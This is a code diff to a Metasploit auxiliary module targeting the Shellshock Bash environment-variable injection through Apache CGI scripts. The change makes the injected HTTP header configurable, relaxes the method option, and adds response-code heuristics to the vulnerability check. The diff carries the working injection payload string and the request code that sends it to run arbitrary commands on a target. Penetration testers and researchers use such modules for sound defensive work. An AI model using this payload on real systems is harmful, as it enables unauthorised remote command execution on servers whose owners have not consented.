@@ -17,7 +17,7 @@ class Metasploit4 < Msf::Auxiliary
       'Description' => %q{
         This module exploits a code injection in specially crafted environment
         variables in Bash, specifically targeting Apache mod_cgi scripts through
-        the HTTP_USER_AGENT variable.
+        the HTTP_USER_AGENT variable by default.
 
         PROTIP: Use exploit/multi/handler with a PAYLOAD appropriate to your
         CMD, set ExitOnSession false, run -j, and then run this module to create
@@ -38,8 +38,8 @@ class Metasploit4 < Msf::Auxiliary
 
     register_options([
       OptString.new('TARGETURI', [true, 'Path to CGI script']),
-      OptEnum.new('METHOD', [true, 'HTTP method to use', 'GET',
-        ['GET', 'POST']]),
+      OptString.new('METHOD', [true, 'HTTP method to use', 'GET']),
+      OptString.new('HEADER', [true, 'HTTP header to use', 'User-Agent']),
       OptString.new('CMD', [true, 'Command to run (absolute paths required)',
         '/usr/bin/id'])
     ], self.class)
@@ -57,10 +57,25 @@ class Metasploit4 < Msf::Auxiliary
         :name => self.name,
         :refs => self.references
       )
-      Exploit::CheckCode::Vulnerable
+      return Exploit::CheckCode::Vulnerable
+    elsif res && res.code == 500
+      injected_res_code = res.code
     else
-      Exploit::CheckCode::Safe
+      return Exploit::CheckCode::Safe
     end
+
+    res = send_request_cgi({
+      'method' => datastore['METHOD'],
+      'uri' => normalize_uri(target_uri.path.to_s)
+    })
+
+    if res && injected_res_code == res.code
+      return Exploit::CheckCode::Unknown
+    elsif res && injected_res_code != res.code
+      return Exploit::CheckCode::Appears
+    end
+
+    Exploit::CheckCode::Unknown
   end
 
   def run_host(ip)
@@ -83,7 +98,9 @@ class Metasploit4 < Msf::Auxiliary
     send_request_cgi(
       'method' => datastore['METHOD'],
       'uri' => normalize_uri(target_uri.path),
-      'agent' => "() { :;};echo #{@marker}$(#{cmd})#{@marker}"
+      'headers' => {
+        datastore['HEADER'] => "() { :;};echo #{@marker}$(#{cmd})#{@marker}"
+      }
     )
   end
 
